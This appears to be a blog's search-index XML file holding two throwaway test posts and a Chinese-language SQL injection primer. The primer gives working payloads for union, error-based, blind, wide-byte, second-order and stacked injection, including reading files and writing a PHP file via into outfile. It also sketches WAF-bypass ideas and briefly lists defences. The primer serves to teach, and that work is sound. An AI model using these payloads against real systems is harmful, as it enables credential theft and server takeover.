<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>test22</title>
    <link href="/2022/10/20/test22/"/>
    <url>/2022/10/20/test22/</url>
    
    <content type="html"><![CDATA[<p>c</p><p>index_img: <img src="image-20221020094613383.png"></p><p>测试图片上传1111</p><p><img src="image-20221020094440688.png"></p><p>!!!!!!!!!!!!!!!本地绝对路径!!!!!!!!!!!!!!!</p><p>one</p><p><img src="image-20221020094440688.png"></p><p>two</p><p><img src="image-20221020094536333.png"></p><p>three</p><p><img src="image-20221020094550791.png" alt="alt"></p><p>four</p><p><img src="image-20221020094605774.png" alt="alt"></p><p>five</p><p><img src="image-20221020094613383.png" alt="alt"></p><p>啊啊啊啊啊!!!!!!</p><p>希望可以上传成功</p>]]></content>
    
    
    
    <tags>
      
      <tag>知识储备,基础学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入基础</title>
    <link href="/2022/10/20/sql-zhu-ru/"/>
    <url>/2022/10/20/sql-zhu-ru/</url>
    
    <content type="html"><![CDATA[<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h4 id="SQL注入概念"><a href="#SQL注入概念" class="headerlink" title="SQL注入概念"></a>SQL注入概念</h4><p>SQL注入就是将构造好的SQL语句插入或者添加到输入参数中进行攻击,利用这个SQL语句执行程序意料之外的结果</p><h4 id="SQL注入的类型"><a href="#SQL注入的类型" class="headerlink" title="SQL注入的类型"></a>SQL注入的类型</h4><ol><li>联合注入</li><li>报错注入</li><li>时间注入</li><li>布尔注入</li><li>宽字节注入</li><li>二次注入</li><li>堆叠注入</li></ol><h4 id="注入点可能存在的地方"><a href="#注入点可能存在的地方" class="headerlink" title="注入点可能存在的地方"></a>注入点可能存在的地方</h4><ol><li> and 1=1  / and 1=2</li><li>引号判断(单引号判断或者双引号) 显示数据库错误信息或者页面回显不正常</li><li>+1  /  -1 </li><li>and sleep(5) 判断页面返回时间</li></ol><h4 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h4><p>1)读文件—-load_file()</p><p>目录路径可以使用十六进制编码</p><p>示例:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://www.sqli.com/Less-<span class="hljs-number">2</span>/?id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(load_file(&#x27;E:/phpStudy/WWW/<span class="hljs-number">1</span>.txt&#x27;)) --+<br></code></pre></td></tr></table></figure><p>2)写文件—-into outfile()</p><p>写入的内容可以进行十六进制的编码,而目录路径不可以进行编码</p><p>示例:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">http://www.sqli.com/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">into</span> OUTFIL<span class="hljs-string">E&#x27;C:/phpStudy/WWW/5.php&#x27;</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>上述两个函数利用的先决条件 </p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> secure<span class="hljs-emphasis">_file_</span>priv=不可为null<br><span class="hljs-bullet">2.</span> 拥有读写文件的权限<br><span class="hljs-bullet">3.</span> 必须知道文件的路径<br><span class="hljs-bullet">4.</span> 写的命令必须全局未开启GPC<br><span class="hljs-bullet">5.</span> 拥有root权限<br></code></pre></td></tr></table></figure><p>3)不满足先决条件的情况</p><p>①dumpfile以二进制的方式写入</p><p>②使用全局日志写入</p><p>③使用慢日志写入</p><h4 id="SQL注入详解"><a href="#SQL注入详解" class="headerlink" title="SQL注入详解"></a>SQL注入详解</h4><p><strong>联合注入</strong></p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">利用前提:页面上有显示位<br>优点:方便/快捷/易于利用<br>缺点:需要显示位<br><br><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span> /<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span>    判断列数<br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>   使用联合注入<br><br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(user()),<span class="hljs-number">3</span><br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(password),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> security.users<br>....各种拼接语句<br></code></pre></td></tr></table></figure><p>MySQL中的union规则</p><p>①union必须有两条或两条以上的select语句组成，语句之间用关键union分隔</p><p>②union中的每个查询必须包含相同的列数</p><p>③union会从查询结果集中自动去除了重复行</p><p>④只有最后一个select子句允许有order by</p><p>⑤只有最后一个select子句允许有limit</p><p><strong>报错注入</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">特征:页面上有没有显示位无所谓,但是需要输出SQL语句执行错误信息,比如,mysqli_error()</span><br><span class="hljs-section">优点:不需要显示位</span><br><span class="hljs-section">缺点:需要输出mysqli_error()的报错信息</span><br></code></pre></td></tr></table></figure><p>常用函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">--xpath语法错误</span><br>extractvalue()<span class="hljs-comment">--查询节点内容</span><br>updatexml()<span class="hljs-comment">--修改查询到的内容</span><br>它们的第二个参数都要求是符合xpath语法的字符串<br>如果不满足要求则会报错，并且将查询结果放在报错信息里<br><br><span class="hljs-comment">--主键重复（duplicate entry）</span><br><span class="hljs-built_in">floor</span>()<span class="hljs-comment">--返回小于等于该值的最大整数</span><br>只要是count，rand()，<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> 三个连用就会造成这种主键重复报错<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1.</span><span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),(concat(<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>),(<span class="hljs-keyword">select</span> version())))x <span class="hljs-keyword">from</span> mysql.user <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x;<br><span class="hljs-keyword">and</span> ( <span class="hljs-keyword">Select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat((<span class="hljs-keyword">user</span>()),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))) <br><span class="hljs-number">2.</span>extractvalue<br><span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,(concat(<span class="hljs-number">0x7e</span>,(database()),<span class="hljs-number">0x7e</span>)))<br><span class="hljs-number">3.</span>updatexml<br><span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>, (concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>)),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><strong>时间注入</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">页面没有显示位,也没有输出<span class="hljs-keyword">SQL</span>语句执行错误信息<br>正确的<span class="hljs-keyword">SQL</span>语句和错误的<span class="hljs-keyword">SQL</span>语句返回页面都一样,但是加入sleep(<span class="hljs-number">5</span>)后,页面的返回速度明细慢了<span class="hljs-number">5</span>秒<br>优点:不需要显示位,不需要出错信息<br>缺点:速度慢,耗费大量时间<br><br>示例:<br>if (ascii(substr(payload, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">115</span>, sleep(<span class="hljs-number">5</span>), <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><strong>布尔注入</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">利用前提:没有显示位也没有输出<span class="hljs-keyword">SQL</span>语句执行错误信息,只能通过页面返回正常不正常<br>优点:不需要显示位,不需要出错信息<br>缺点:速度慢,耗费大量时间<br><br>示例:<br>  <span class="hljs-keyword">select</span> password <span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span> <span class="hljs-comment">---payload</span><br>  ascii(substr(<span class="hljs-string">&#x27;payload&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">65</span><br></code></pre></td></tr></table></figure><p>常用函数:</p><p>exists(sql)  ———–( in )类似于子查询.看sql语句查询的值是否存在,存在返回true</p><p>ascii(str)    ———- a-&gt;97  A-&gt;65 字符转化为ASCII      范围65-90,97-122</p><p>HEX((STR))  —————-进行hex十六进制编码</p><p>substr(str,start,len)    ———-截取字符串(要前也要后)</p><p>ord()  ———-类似ASCII  只转第一个字符</p><p>mid() ————类似substr</p><p>length() ————–取长度</p><p>left(str,end) —————从左边开始取</p><p>regexp()  —————–类似于like(selec * from user where username regexp ‘Dumb’)</p><p>like()     ——————类似于regexp</p><p><strong>宽字节注入</strong></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">在数据库中使用了宽字符集(GBK，GB<span class="hljs-number">2312</span>等)，除了英文都是一个字符占两字节；<br>MySQL在使用GBK编码的时候，会认为两个字符为一个汉字(ascii&gt;<span class="hljs-number">128</span>才能达到汉字范围)；<br>在PHP中使用addslashes函数的时候，会对单引号<span class="hljs-variable">%27</span>进行转义，在前边加一个反斜杠”\”，变成<span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%27</span><span class="hljs-comment">;</span><br>可以在前边添加<span class="hljs-variable">%df</span><span class="hljs-punctuation">,</span>形成<span class="hljs-variable">%df</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%27</span>，而数据进入数据库中时前边的<span class="hljs-variable">%df</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span>两字节会被当成一个汉字<span class="hljs-comment">;</span><br><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span>被吃掉了，单引号由此逃逸可以用来闭合语句。<br></code></pre></td></tr></table></figure><p><strong>二次注入</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sql">第一步：插入恶意数据<br>进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。<br>第二步：引用恶意数据<br>开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。<br><br><br>例如:<br>第一步:<br>输入   admin\<span class="hljs-string">&#x27;#        </span><br><span class="hljs-string">进入到数据库中存储变成 admin&#x27;</span>#<br><br>第二步:<br>当数据进行修改或者更新的时候,从数据库中取出用户 admin<span class="hljs-string">&#x27;#</span><br><span class="hljs-string">在SQL语句中会变成 admin\&#x27;</span>#    进而间接修改或者更新了 admin 的数据<br></code></pre></td></tr></table></figure><p><strong>堆叠注入</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">堆叠注入本质上就是<span class="hljs-keyword">SQL</span>语句的拼接,每句<span class="hljs-keyword">SQL</span>语句结束之后用分号结尾,再拼接下一条<span class="hljs-keyword">SQL</span>语句实现堆叠注入<br><br>示例:<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<span class="hljs-keyword">select</span> password <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">2</span>;......<br></code></pre></td></tr></table></figure><h4 id="SQL注入防御"><a href="#SQL注入防御" class="headerlink" title="SQL注入防御"></a>SQL注入防御</h4><p>1.预处理(PDO)+数据绑定。</p><p>2.字符型使用函数addslashes()</p><p>3.整型使用函数intval()</p><p>4.正则匹配进行转义</p><h4 id="SQL注入绕waf思路"><a href="#SQL注入绕waf思路" class="headerlink" title="SQL注入绕waf思路"></a>SQL注入绕waf思路</h4><p>1.软件型waf,例如安全狗、云锁、D盾等</p><p>​        1)双写/大小写</p><p>​        2)内联注释</p><p>​        3)垃圾字符填充</p><p>​        4)换行或者截断</p><p>2.云waf,例如腾讯云、华为云、玄武盾等</p><p>绕过云waf原理就是找到服务器真实的IP地址,将其绑定到本地的hosts文件中即可</p><p>​        1)全球ping</p><p>​        2)历史解析记录</p><p>​        3)DDOS</p><p>3.代码型waf</p><p>​    白盒审计,绕过正则匹配</p>]]></content>
    
    
    
    <tags>
      
      <tag>知识储备 基础学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>zyl-test11</title>
    <link href="/2022/10/18/zyl-test11/"/>
    <url>/2022/10/18/zyl-test11/</url>
    
    <content type="html"><![CDATA[<p>test111测试文件</p><h1 id="the-first-page"><a href="#the-first-page" class="headerlink" title="the first page"></a>the first page</h1><p>32415678490e-qwp[asdklmczx niscdepfkorlmxc bjhjml,.dfrgmt54jrgdfghjasdfghjklqwertyuiop[zxcvbnm,./1234567890-=asdfghjkl;zxcvbnm,./1234567890-]]</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
